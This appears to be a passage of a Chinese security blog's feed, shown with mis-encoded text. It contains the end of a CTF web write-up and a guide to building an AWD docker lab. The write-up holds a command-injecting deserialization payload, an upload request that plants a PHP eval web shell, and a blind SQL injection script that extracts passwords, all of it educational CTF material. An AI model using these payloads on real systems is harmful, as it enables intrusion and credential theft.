string">"me"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token operator">===</span><span class="token string">"flag"</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br>welcome!&lt;br>"</span><span class="token punctuation">;</span>                <span class="token variable">$come</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'come'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$come</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>think about it&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"NO"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Can you hack me?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>è¿™æ˜¯ä¸€ä¸ªå…³é”®ç‚¹ä¸ºååºåˆ—åŒ–çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ„é€ getå‚æ•°ç»•è¿‡å‰é¢çš„æ£€æµ‹ï¼Œæ¥åˆ°postå‚æ•°å¤„ã€‚</p><p>æ„é€ getå‚æ•°:<code>?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code>,é€šè¿‡parse_strè¦†ç›–åŸæœ‰å˜é‡å³å¯ã€‚</p><p>ç„¶åè¿™é¢˜å¹¶ä¸æ˜¯ç»•è¿‡wakeupï¼Œå› ä¸ºåœ¨æ–°ç‰ˆphpä¸­å·²ç»ä¿®å¤è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¦åœ¨echo($host)å¤„æ³¨å…¥å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦è§„è§„çŸ©çŸ©åœ°è¿›è¡Œç»•è¿‡è¿‡æ»¤ï¼Œå°†æ„é€ çš„come Postè¿‡å»ï¼š</p><p><code>come==O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3B%3A1%3A%7Bi%3A0%3Bs%3A23%3A%22aaa%26%26cat%24IFS%22%2Fflflagag%22%22%3B%7D%7D</code></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸ç”¨ç©ºæ ¼æ‰§è¡Œå‘½ä»¤ï¼ˆ <a href="https://www.cnblogs.com/sevck/p/6072721.html" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥ </a>ï¼‰ï¼Œä»¥åŠååºåˆ—åŒ–ä¸­ç§æœ‰å˜é‡çš„%00é—®é¢˜ï¼Œå¦‚æœä¸ä»¥urlç¼–ç å½¢å¼ï¼Œ%00å¹¶ä¸ä¼šèµ·ä½œç”¨ã€‚</p></blockquote><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><blockquote><p>è™½ç„¶æ²¡åšå‡ºæ¥ğŸ˜­ï¼Œä½†è¿˜æ˜¯è¦å­¦ä¹ ä¸€ä¸‹çš„ã€‚</p><p>åˆæ˜¯phpçš„ä»£ç å®¡è®¡é¢˜ã€‚</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//error_reporting(0);</span>    <span class="token comment" spellcheck="true">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span>    <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"icq"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/sandbox/'</span> <span class="token punctuation">.</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token operator">==</span><span class="token variable">$filename</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"emmmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$new_name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hehe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">'@&lt;?php'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p>è€ƒå¯Ÿä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼Œä¸€ä¸ªæ˜¯æ•°ç»„ç»•è¿‡ï¼Œä»¥åŠunlink  <del>php/.</del> ç»•è¿‡ã€‚</p><p>æ„é€ æ•°æ®åŒ…å¦‚ä¸‹ï¼ˆæœ¬åœ°å¤ç°ï¼‰ï¼š</p><pre class=" language-shell"><code class="language-shell">POST /shawsweb3.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://127.0.0.1/upload.htmlContent-Type: multipart/form-data; boundary=----------------------------280543779984883401718121Content-Length: 586Connection: closeUpgrade-Insecure-Requests: 1----------------------------280543779984883401718121Content-Disposition: form-data; name="file[0]"php----------------------------280543779984883401718121Content-Disposition: form-data; name="file[a]"php/.----------------------------280543779984883401718121Content-Disposition: form-data; name="hehe"100.php----------------------------280543779984883401718121Content-Disposition: form-data; name="file"; filename="index.php"Content-Type: application/x-httpd-php@<?php    @eval($_GET['cmd']);?>----------------------------280543779984883401718121--</code></pre><p>å†é€šè¿‡éå†æ–‡ä»¶åæ‹¿åˆ°æƒé™ï¼Œgetflagã€‚</p></blockquote><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>æ—¶é—´ç›²æ³¨ + æ–‡ä»¶åæ‹¼æ¥  + ä¸Šä¼ æˆªæ–­ç»•è¿‡ï¼Œ%02é»‘è„¸æˆªæ–­ğŸ˜„ã€‚</p><p>æ„é€ å‡ºpayloadåå¯ä»¥ç›´æ¥æ‹¿ç»™sqlmapè·‘ï¼Ÿç¥å™¨ï¼ˆæœ‰æ—¶é—´å†æ·±å…¥ç ”ç©¶ä¸€ä¸‹ï¼‰ã€‚ä¹Ÿå¯ä»¥è‡ªå·±å†™è„šæœ¬è·‘ï¼Œä¾‹å¦‚ä¸‹é¢å°±æ˜¯æˆ‘è®¤ä¸ºä¸€ä¸ªå†™çš„æ¯”è¾ƒç®€å•æ˜“ç”¨çš„è„šæœ¬ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#é‡ç”¨æ€§é«˜çš„ä»£ç æ˜¯å¥½ä»£ç </span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> text <span class="token operator">!=</span> <span class="token string">'$content=str_replace($value,"",$content)'</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://dbeffc8ba3a84abebc7ff930c5d6fda460a4bee570ff4211.game.ichunqiu.com/select_guest.php"</span>    <span class="token keyword">return</span> get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">blind_inject</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        left <span class="token operator">=</span> <span class="token number">0</span>        right <span class="token operator">=</span> <span class="token number">128</span>        <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            c <span class="token operator">=</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            payload <span class="token operator">=</span> s<span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(payload)</span>            <span class="token keyword">if</span> judge<span class="token punctuation">(</span>test<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>        r <span class="token operator">+=</span> chr<span class="token punctuation">(</span>left<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token operator">+</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#blind_inject("1%27%20and%20substr(database(),{},1)%20>%20%27{}%27%23")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),{},1) > '{}'#")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(column_name) FROM information_schema . columns WHERE table_name = 'user' and table_schema=database()), {},1) > '{}' #")</span>    <span class="token comment" spellcheck="true">#</span>    blind_inject<span class="token punctuation">(</span><span class="token string">"1' and substr((SELECT password FROM web.user where id = 1), {},1) > '{}' #"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è·‘flagå³å¯ã€‚</p><p>emmmä»¥ä¸Šæ˜¯ç›²æ³¨çš„æ–¹æ³•ï¼Œé‚£ä¹ˆä¸‹é¢è¿˜æœ‰é€šè¿‡fuzzå¾—åˆ°è¿‡æ»¤å…³é”®å­—ï¼Œç„¶åç»•è¿‡ç›´æ¥æ³¨çš„ï¼Œå› ä¸ºè¿™æ˜¯æœ‰å›æ˜¾çš„ä¸€ä¸ªæ³¨å…¥å˜›ã€‚</p><p><code>id=sd&#39; unifromon selselectect (seselectlect group_concat(username,&#39;:&#39;,password)frfromom web.user),2#</code></p><p>æ€»ä¹‹æ–¹æ³•æ€»æ˜¯å¤šç§å¤šæ ·çš„ã€‚</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><blockquote><p>è‡³äºäºŒè¿›åˆ¶ï¼Œè¿˜åœ¨å­¦ä¹ ä¹‹ä¸­ï¼Œå¯†ç å­¦çš„RSA,å’ŒAESä¹Ÿéœ€è¦æŠ½ä¸ªæ—¶é—´æ¥æ·±å…¥ç ”ç©¶ä¸€ä¸‹ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="writeup" scheme="http://www.yof3ng.xyz/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD_docker</title>
    <link href="http://www.yof3ng.xyz/2018/11/03/AWD-docker/"/>
    <id>http://www.yof3ng.xyz/2018/11/03/AWD-docker/</id>
    <published>2018-11-03T15:16:26.000Z</published>
    <updated>2019-04-02T08:38:20.075Z</updated>
    
    <content type="html"><![CDATA[<p>æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD dockerã€‚</p><a id="more"></a><h1 id="æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD-docker"><a href="#æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD-docker" class="headerlink" title="æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD docker"></a>æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD docker</h1><h2 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h2><blockquote><p>ä¹‹å‰å·²ç»è®²è¿‡dockeræ€ä¹ˆå®‰è£…ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œ<code>sudo apt-get install docker.io</code>ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚</p></blockquote><h2 id="æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image"><a href="#æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image" class="headerlink" title="æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image"></a>æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image</h2><blockquote><p>é€šè¿‡<code>sudo docker search lamp</code>ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾åˆ°æœ‰lampé›†æˆç¯å¢ƒçš„ä»–äººä¸Šä¼ çš„imageï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224056.png" alt=""></p><p>äºæ˜¯æˆ‘é€‰æ‹©äº† tutum/lampè¿™ä¸ªimageã€‚</p><p>ä½¿ç”¨å‘½ä»¤ï¼š<code>sudo docker pull tutum/lamp</code>ï¼Œå°†imageæ‹‰å–åˆ°æœ¬åœ°åï¼Œä½¿ç”¨å‘½ä»¤<code>sudo docker images</code>æŸ¥çœ‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224557.png" alt=""></p></blockquote><h2 id="å°†CTF-xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹"><a href="#å°†CTF-xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹" class="headerlink" title="å°†CTF_xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹"></a>å°†CTF_xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹</h2><blockquote><p>ä¿®æ”¹å¦‚ä¸‹:</p><ul><li><p>å°†åŸæ¥çš„<code>FORM ubuntu:16.04</code>æ”¹ä¸º<code>FROM tutum/lamp</code>å³ä¹‹å‰æ‹‰å–ä¸‹æ¥çš„å…·æœ‰webç¯å¢ƒçš„imageã€‚</p></li><li><p>æ·»åŠ <code>RUN apt-get -y install openssh-server</code>ä¸ºsshè¿æ¥åšå‡†å¤‡ã€‚</p></li><li>æ·»åŠ awdå‚èµ›è€…ç”¨æˆ·<code>RUN useradd -u 544  -g users -s /bin/bash -m awduser</code></li><li>æ·»åŠ htmlç›®å½•ä¸‹çš„webé¢˜æºç :<code>COPY ./html/ /var/www/html/web/</code></li><li>é…ç½®sshè¿œç¨‹è¿æ¥ï¼š<code>COPY ./sshd_config.txt /etc/ssh/sshd_config</code></li></ul></blockquote><pre class=" language-dockerfile"><code class="language-dockerfile">FROM tutum/lampRUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list && \    apt-get update && \    apt-get install -y lib32z1 xinetdRUN apt-get -y install openssh-serverRUN useradd -m ctfRUN useradd -u 544  -g users -s /bin/bash -m awduserWORKDIR /home/RUN cp -R /lib* /home/ctf && \    cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/dev && \    mknod /home/ctf/dev/null c 1 3 && \    mknod /home/ctf/dev/zero c 1 5 && \    mknod /home/ctf/dev/random c 1 8 && \    mknod /home/ctf/dev/urandom c 1 9 && \    chmod 666 /home/ctf/dev/*RUN mkdir /home/ctf/bin && \    cp /bin/sh /home/ctf/bin && \    cp /bin/ls /home/ctf/bin && \    cp /bin/cat /home/ctf/bin && \    cp /bin/bash /home/ctf/bin && \    cp /bin/nc /home/ctf/bin && \    cp /usr/bin/git /home/ctf/binCOPY ./ctf.xinetd /etc/xinetd.d/ctfCOPY ./start.sh /start.shRUN echo "Blocked by ctf_xinetd" > /etc/banner_failRUN chmod +x /start.shCOPY ./html/ /var/www/html/web/COPY ./bin/ /home/ctf/COPY ./sshd_config.txt /etc/ssh/sshd_configRUN chown -R root:ctf /home/ctf && \    chown -R awduser:users /var/www/html/* && \    chmod -R 777 /var/www/html/* && \    chmod -R 750 /home/ctf && \    chmod 740 /home/ctf/flagRUN service ssh startCMD ["/start.sh"]CMD ["/run.sh"]EXPOSE 9999</code></pre><p>é™„ä¸Šsshd_configé…ç½®ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#    $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $</span><span class="token comment" spellcheck="true"># This is the sshd server system-wide configuration file.  See</span><span class="token comment" spellcheck="true"># sshd_config(5) for more information.</span><span class="token comment" spellcheck="true"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><span class="token comment" spellcheck="true"># The strategy used for options in the default sshd_config shipped with</span><span class="token comment" spellcheck="true"># OpenSSH is to specify options with their default value where</span><span class="token comment" spellcheck="true"># possible, but leave them commented.  Uncommented options override the</span><span class="token comment" spellcheck="true"># default value.</span><span class="token comment" spellcheck="true">#Port 22</span><span class="token comment" spellcheck="true">#AddressFamily any</span><span class="token comment" spellcheck="true">#ListenAddress 0.0.0.0</span><span class="token comment" spellcheck="true">#ListenAddress ::</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_rsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ed25519_key</span><span class="token comment" spellcheck="true"># Ciphers and keying</span><span class="token comment" spellcheck="true">#RekeyLimit default none</span><span class="token comment" spellcheck="true"># Logging</span><span class="token comment" spellcheck="true">#SyslogFacility AUTH</span><span class="token comment" spellcheck="true">#LogLevel INFO</span><span class="token comment" spellcheck="true"># Authentication:</span><span class="token comment" spellcheck="true">#LoginGraceTime 2m</span><span class="token comment" spellcheck="true">#PermitRootLogin prohibit-password</span><span class="token comment" spellcheck="true">#StrictModes yes</span><span class="token comment" spellcheck="true">#MaxAuthTries 6</span><span class="token comment" spellcheck="true">#MaxSessions 10</span><span class="token comment" spellcheck="true">#PubkeyAuthentication yes</span><span class="token comment" spellcheck="true"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><span class="token comment" spellcheck="true">#AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</span><span class="token comment" spellcheck="true">#AuthorizedPrincipalsFile none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommand none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommandUser nobody</span><span class="token comment" spellcheck="true"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><span class="token comment" spellcheck="true">#HostbasedAuthentication no</span><span class="token comment" spellcheck="true"># Change to yes if you don't trust ~/.ssh/known_hosts for</span><span class="token comment" spellcheck="true"># HostbasedAuthentication</span><span class="token comment" spellcheck="true">#IgnoreUserKnownHosts no</span><span class="token comment" spellcheck="true"># Don't read the user's ~/.rhosts and ~/.shosts files</span><span class="token comment" spellcheck="true">#IgnoreRhosts yes</span><span class="token comment" spellcheck="true"># To disable tunneled clear text passwords, change to no here!</span><span class="token comment" spellcheck="true">#PasswordAuthentication yes</span><span class="token comment" spellcheck="true">#PermitEmptyPasswords no</span><span class="token comment" spellcheck="true"># Change to yes to enable challenge-response passwords (beware issues with</span><span class="token comment" spellcheck="true"># some PAM modules and threads)</span>ChallengeResponseAuthentication no<span class="token comment" spellcheck="true"># Kerberos options</span><span class="token comment" spellcheck="true">#KerberosAuthentication no</span><span class="token comment" spellcheck="true">#KerberosOrLocalPasswd yes</span><span class="token comment" spellcheck="true">#KerberosTicketCleanup yes</span><span class="token comment" spellcheck="true">#KerberosGetAFSToken no</span><span class="token comment" spellcheck="true"># GSSAPI options</span><span class="token comment" spellcheck="true">#GSSAPIAuthentication no</span><span class="token comment" spellcheck="true">#GSSAPICleanupCredentials yes</span><span class="token comment" spellcheck="true">#GSSAPIStrictAcceptorCheck yes</span><span class="token comment" spellcheck="true">#GSSAPIKeyExchange no</span><span class="token comment" spellcheck="true"># Set this to 'yes' to enable PAM authentication, account processing,</span><span class="token comment" spellcheck="true"># and session processing. If this is enabled, PAM authentication will</span><span class="token comment" spellcheck="true"># be allowed through the ChallengeResponseAuthentication and</span><span class="token comment" spellcheck="true"># PasswordAuthentication.  Depending on your PAM configuration,</span><span class="token comment" spellcheck="true"># PAM authentication via ChallengeResponseAuthentication may bypass</span><span class="token comment" spellcheck="true"># the setting of "PermitRootLogin without-password".</span><span class="token comment" spellcheck="true"># If you just want the PAM account and session checks to run without</span><span class="token comment" spellcheck="true"># PAM authentication, then enable this but set PasswordAuthentication</span><span class="token comment" spellcheck="true"># and ChallengeResponseAuthentication to 'no'.</span>UsePAM <span class="token function">yes</span><span class="token comment" spellcheck="true">#AllowAgentForwarding yes</span><span class="token comment" spellcheck="true">#AllowTcpForwarding yes</span><span class="token comment" spellcheck="true">#GatewayPorts no</span>X11Forwarding <span class="token function">yes</span><span class="token comment" spellcheck="true">#X11DisplayOffset 10</span><span class="token comment" spellcheck="true">#X11UseLocalhost yes</span><span class="token comment" spellcheck="true">#PermitTTY yes</span>PrintMotd no<span class="token comment" spellcheck="true">#PrintLastLog yes</span><span class="token comment" spellcheck="true">#TCPKeepAlive yes</span><span class="token comment" spellcheck="true">#UseLogin no</span><span class="token comment" spellcheck="true">#PermitUserEnvironment no</span><span class="token comment" spellcheck="true">#Compression delayed</span><span class="token comment" spellcheck="true">#ClientAliveInterval 0</span><span class="token comment" spellcheck="true">#ClientAliveCountMax 3</span><span class="token comment" spellcheck="true">#UseDNS no</span><span class="token comment" spellcheck="true">#PidFile /var/run/sshd.pid</span><span class="token comment" spellcheck="true">#MaxStartups 10:30:100</span><span class="token comment" spellcheck="true">#PermitTunnel no</span><span class="token comment" spellcheck="true">#ChrootDirectory none</span><span class="token comment" spellcheck="true">#VersionAddendum none</span><span class="token comment" spellcheck="true"># no default banner path</span><span class="token comment" spellcheck="true">#Banner none</span><span class="token comment" spellcheck="true"># Allow client to pass locale environment variables</span>AcceptEnv LANG LC_*<span class="token comment" spellcheck="true"># override default of no subsystems</span>Subsystem    <span class="token function">sftp</span>    /usr/lib/openssh/sftp-server<span class="token comment" spellcheck="true"># Example of overriding settings on a per-user basis</span><span class="token comment" spellcheck="true">#Match User anoncvs</span><span class="token comment" spellcheck="true">#    X11Forwarding no</span><span class="token comment" spellcheck="true">#    AllowTcpForwarding no</span><span class="token comment" spellcheck="true">#    PermitTTY no</span><span class="token comment" spellcheck="true">#    ForceCommand cvs server</span></code></pre><blockquote><p>æ­¤æ—¶ctf_xinetdæ–‡ä»¶å¤¹ä¸‹çš„æƒ…å†µå¤§è‡´å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103225916.png" alt=""></p><p>binæ–‡ä»¶å¤¹ç”¨äºæ”¾ç½® pwné¢˜çš„binaryç¨‹åºå’Œflagï¼Œhtmlæ–‡ä»¶å¤¹ç”¨äºæ”¾ç½®web_phpç¯å¢ƒçš„æºç ã€‚</p></blockquote><h2 